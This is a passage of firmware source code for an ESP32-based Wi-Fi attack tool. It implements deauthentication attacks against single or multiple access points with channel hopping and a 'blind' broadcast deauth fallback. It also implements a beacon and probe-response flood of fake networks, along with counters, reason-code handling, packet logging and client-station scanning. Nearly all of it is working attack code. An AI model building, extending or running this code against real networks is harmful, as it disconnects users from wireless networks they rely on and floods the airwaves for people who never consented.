            radio_set_channel("deauth", s_sta_scan_channel);
        }
        if (now > s_sta_scan_deadline) {
            s_sta_scan_active = false;
            esp_wifi_set_promiscuous(false);
            s_sta_scan_ready = true;
        }
        return;
    }

    if (s_mode == ATTACK_DEAUTH_SINGLE || s_mode == ATTACK_DEAUTH_MULTI) {
        if (now != s_last_inject_ms && (int32_t)(now - s_backoff_until_ms) >= 0) {
            s_last_inject_ms = now;
            drain_tx_queue();
        }
    }

    // Blind fallback: a broadcast deauth to the AP we are parked on. It needs no
    // sniffed client, so it still does something when every client in the BSS is
    // silent -- or talks 802.11ax, which an 11n radio cannot decode at all.
    if (s_mode == ATTACK_DEAUTH_SINGLE) {
        if (now - s_last_blind_ms >= BLIND_DEAUTH_PERIOD_MS) {
            s_last_blind_ms = now;
            if (inject_one(kBroadcast, s_single_bssid, next_reason())) {
                s_blind_frames++;
            }
        }
    } else if (s_mode == ATTACK_DEAUTH_MULTI) {
        if (now - s_last_blind_ms >= BLIND_DEAUTH_PERIOD_MS) {
            s_last_blind_ms = now;
            for (int tries = 0; tries < s_ap_count; tries++) {
                const int idx = (s_ap_cursor + tries + s_ap_count) % s_ap_count;
                if (s_aps[idx].enabled) {
                    if (inject_one(kBroadcast, s_aps[idx].bssid, next_reason())) {
                        s_blind_frames++;
                        s_aps[idx].frames++;
                    }
                    break;
                }
            }
        }
    }

    if (s_mode == ATTACK_DEAUTH_MULTI) {
        if (s_ap_count == 0) {
            return;
        }
        if (s_ap_cursor < 0 || now - s_ap_last_hop >= 250) {
            s_ap_last_hop = now;
            for (int tries = 0; tries < s_ap_count; tries++) {
                s_ap_cursor = (s_ap_cursor + 1) % s_ap_count;
                if (s_aps[s_ap_cursor].enabled) {
                    radio_set_channel("deauth", s_aps[s_ap_cursor].channel);
                    break;
                }
            }
        }
        return;
    }

    if (s_mode == ATTACK_PROBE_BROADCAST) {
        if (now - s_last_channel_hop > 120) {
            s_last_channel_hop = now;
            radio_set_channel("deauth", next_probe_channel());
        }
        if (now - s_last_probe >= 4) {
            s_last_probe = now;
            uint8_t frame[96];
            uint8_t bssid[6];
            char ssid[16];
            // Flood the air with fake APs: beacons plus broadcast probe responses.
            // Both go out at legacy rates, so any nearby client sees a wall of
            // bogus networks regardless of its own PHY generation.
            for (int i = 0; i < 4; i++) {
                random_ssid(ssid, sizeof(ssid));
                random_mac(bssid);
                size_t len = build_beacon_like(frame, 8, kBroadcast, bssid, ssid, s_probe_channel);
                esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
                s_probe_frames++;
                len = build_beacon_like(frame, 5, kBroadcast, bssid, ssid, s_probe_channel);
                esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
                s_probe_frames++;
            }
        }
    }
}

attack_mode_t attack_get_mode() {
    return s_mode;
}

const char* attack_mode_name() {
    switch (s_mode) {
        case ATTACK_DEAUTH_SINGLE:
            return "deauth";
        case ATTACK_DEAUTH_MULTI:
            return "deauth-multi";
        case ATTACK_PROBE_BROADCAST:
            return "probe-bcast";
        default:
            return "idle";
    }
}

uint32_t attack_deauth_frames() {
    return s_deauth_frames;
}

uint32_t attack_probe_frames() {
    return s_probe_frames;
}

uint32_t attack_rx_frames() {
    return s_rx_total;
}

uint32_t attack_tx_ok() {
    return s_tx_ok;
}

uint32_t attack_tx_err() {
    return s_tx_err;
}

int attack_tx_last_err(void) {
    return s_tx_last_err;
}

uint32_t attack_tx_err_nomem(void) {
    return s_tx_err_nomem;
}

uint32_t attack_tx_err_invalid(void) {
    return s_tx_err_invalid;
}

uint32_t attack_tx_err_other(void) {
    return s_tx_err_other;
}

uint32_t attack_tx_dropped(void) {
    return s_tx_dropped;
}

uint32_t attack_blind_frames() {
    return s_blind_frames;
}

uint32_t attack_reverse_frames() {
    return s_rev_frames;
}

void attack_set_reason(uint16_t code) {
    s_reason = code == 0 ? 1 : code;
    s_reason_last = s_reason;
    s_reason_random = false;
}

void attack_set_reason_random(void) {
    s_reason_random = true;
}

bool attack_reason_is_random(void) {
    return s_reason_random;
}

uint16_t attack_reason_last(void) {
    return s_reason_last;
}

// Defined reason codes: everything a client is expected to understand. Used by
// the console to warn when a custom value is outside this set.
bool attack_reason_is_defined(uint16_t code) {
    for (size_t i = 0; i < sizeof(kReasonPool) / sizeof(kReasonPool[0]); i++) {
        if (kReasonPool[i] == code) {
            return true;
        }
    }
    return false;
}

void attack_rx_mix(uint32_t mgmt_sub[16], uint32_t* ctrl, uint32_t* data) {
    for (int i = 0; i < 16; i++) {
        mgmt_sub[i] = s_rx_mgmt_sub[i];
    }
    if (ctrl != nullptr) {
        *ctrl = s_rx_ctrl;
    }
    if (data != nullptr) {
        *data = s_rx_data;
    }
}

uint32_t attack_rx_matches() {
    return s_rx_match;
}

int attack_rx_log_count() {
    return s_rx_log_count;
}

// Index 0 is the oldest sample the ring still holds.
static rx_sample_t* rx_log_slot(int i) {
    const int start = (s_rx_log_head - s_rx_log_count + kRxLogSize) % kRxLogSize;
    return &s_rx_log[(start + i) % kRxLogSize];
}

bool attack_rx_log_at(int i, uint8_t dest[6], uint8_t src[6], uint8_t bssid[6], uint8_t* type,
                      uint8_t* subtype, uint16_t* len) {
    if (i < 0 || i >= s_rx_log_count) {
        return false;
    }
    const rx_sample_t* sample = rx_log_slot(i);
    memcpy(dest, sample->dest, 6);
    memcpy(src, sample->src, 6);
    memcpy(bssid, sample->bssid, 6);
    if (type) *type = sample->type;
    if (subtype) *subtype = sample->subtype;
    if (len) *len = sample->len;
    return true;
}

void attack_rx_log_info(int i, uint8_t* cat, uint8_t* act, uint8_t* nch, uint8_t* cnt) {
    if (i < 0 || i >= s_rx_log_count) {
        return;
    }
    const rx_sample_t* sample = rx_log_slot(i);
    if (cat) *cat = sample->cat;
    if (act) *act = sample->act;
    if (nch) *nch = sample->nch;
    if (cnt) *cnt = sample->cnt;
}

bool attack_rx_log_radio(int i, rx_radio_t* out) {
    if (out == nullptr || i < 0 || i >= s_rx_log_count) {
        return false;
    }
    *out = rx_log_slot(i)->radio;
    return true;
}

// Mbps doubled, so 5.5 does not need a float. Index is the driver's rate code,
// not the L-SIG encoding.
static const uint16_t kLegacyMbps2[12] = {2, 4, 11, 22, 12, 18, 24, 36, 48, 72, 96, 108};

static void format_mbps2(uint16_t mbps2, char* buf, int buf_len) {
    if (mbps2 % 2 == 0) {
        snprintf(buf, buf_len, "%uM", (unsigned)(mbps2 / 2));
    } else {
        snprintf(buf, buf_len, "%u.5M", (unsigned)(mbps2 / 2));
    }
}

// 11g/11a 的 OFDM 速率编码，单位是 0.5 Mbps。台架实测反推：设 6M 读回 0xB、
// 设 12M 读回 0xA、设 54M 读回 0xC —— 是 L-SIG 的 RATE 字段按 LSB-first 解释
// 之后的值，跟标准表正序不是一回事。按标准表查会把 6M 报成 54M。
static uint16_t ofdm_mbps2(uint8_t code) {
    switch (code & 0x0F) {
        case 0x0B: return 12;   // 6
        case 0x0F: return 18;   // 9
        case 0x0A: return 24;   // 12
        case 0x0E: return 36;   // 18
        case 0x09: return 48;   // 24
        case 0x0D: return 72;   // 36
        case 0x08: return 96;   // 48
        case 0x0C: return 108;  // 54
        default: return 0;
    }
}

const char* rx_rate_text(uint8_t fmt, uint8_t rate, uint8_t mcs, uint8_t sgi, char* buf,
                         int buf_len) {
    if (buf == nullptr || buf_len < 12) {
        return "-";
    }
#if CONFIG_SOC_WIFI_HE_SUPPORT
    // C5: cur_bb_format tells 11b from 11g. 11b frames carry the CCK index;
    // everything else carries the L-SIG RATE code, which on HT/VHT/HE only
    // describes the preamble -- those get a format name instead of a number.
    if (fmt == 0) {
        if (rate >= 4) {
            return "-";
        }
        format_mbps2(kLegacyMbps2[rate], buf, buf_len);
        return buf;
    }
    if (fmt == 1) {
        const uint16_t mbps2 = ofdm_mbps2(rate);
        if (mbps2 == 0) {
            return "-";
        }
        format_mbps2(mbps2, buf, buf_len);
        return buf;
    }
    switch (fmt) {
        case 2: return "ht";
        case 3: return "vht";
        case 4:
        case 5:
        case 6:
        case 7: return "he";
        default: return "-";
    }
#else
    // Classic ESP32 has no cur_bb_format, so the code value itself tells the
    // two apart: 0..3 is a CCK index, 8..15 is the OFDM L-SIG code.
    if (fmt == 0) {
        if (rate < 4) {
            format_mbps2(kLegacyMbps2[rate], buf, buf_len);
            return buf;
        }
        const uint16_t mbps2 = ofdm_mbps2(rate);
        if (mbps2 == 0) {
            return "-";
        }
        format_mbps2(mbps2, buf, buf_len);
        return buf;
    }
    if (fmt == 2) {
        const uint8_t m = (mcs > 7) ? 7 : mcs;
        const uint16_t mbps10 = (uint16_t)((sgi ? 72u : 65u) * (unsigned)(m + 1));
        snprintf(buf, buf_len, "mcs%u/%u.%uM", (unsigned)m, (unsigned)(mbps10 / 10),
                 (unsigned)(mbps10 % 10));
        return buf;
    }
    return "-";
#endif
}

int attack_csa_log_count(void) {
    return s_csa_log_count;
}

bool attack_csa_log_at(int i, uint8_t src[6], uint8_t* nch, uint8_t* cnt, uint8_t* cat,
                       uint8_t* act, uint16_t* len) {
    if (i < 0 || i >= s_csa_log_count) {
        return false;
    }
    if (src) memcpy(src, s_csa_log[i].src, 6);
    if (nch) *nch = s_csa_log[i].nch;
    if (cnt) *cnt = s_csa_log[i].cnt;
    if (cat) *cat = s_csa_log[i].cat;
    if (act) *act = s_csa_log[i].act;
    if (len) *len = s_csa_log[i].len;
    return true;
}

int attack_ap_count() {
    return s_ap_count;
}

int attack_ap_enabled_count() {
    int n = 0;
    for (int i = 0; i < s_ap_count; i++) {
        if (s_aps[i].enabled) n++;
    }
    return n;
}

bool attack_ap_info(int i, const uint8_t** bssid, uint32_t* frames, uint8_t* channel) {
    if (i < 0 || i >= s_ap_count) {
        return false;
    }
    if (bssid) *bssid = s_aps[i].bssid;
    if (frames) *frames = s_aps[i].frames;
    if (channel) *channel = s_aps[i].channel;
    return true;
}

void stations_begin(uint16_t seconds) {
    s_sta_count = 0;
    s_sta_scan_active = true;
    s_sta_scan_ready = false;
    s_sta_scan_deadline = millis() + (uint32_t)seconds * 1000UL;
    s_sta_scan_channel = 1;
    s_sta_scan_last_hop = 0;
    apply_band_mode();
    apply_country(CHANNEL_MAX, true);
    radio_to_sta();
    radio_set_channel("deauth", s_sta_scan_channel);
    start_promiscuous();
}

bool stations_poll() {
    if (s_sta_scan_active || !s_sta_scan_ready) {
        return false;
    }
    s_sta_scan_ready = false;
    return true;
}

int stations_count() {
    return s_sta_count;
}

bool stations_info(int i, const uint8_t** mac, const uint8_t** ap, uint8_t* channel, int16_t* rssi,
                   uint32_t* frames) {
    if (i < 0 || i >= s_sta_count) {
        return false;
    }
    if (mac) *mac = s_stas[i].mac;
    if (ap) *ap = s_stas[i].ap;
    if (channel) *channel = s_stas[i].channel;
    if (rssi) *rssi = s_stas[i].rssi;
    if (frames) *frames = s_stas[i].frames;
    return true;
}
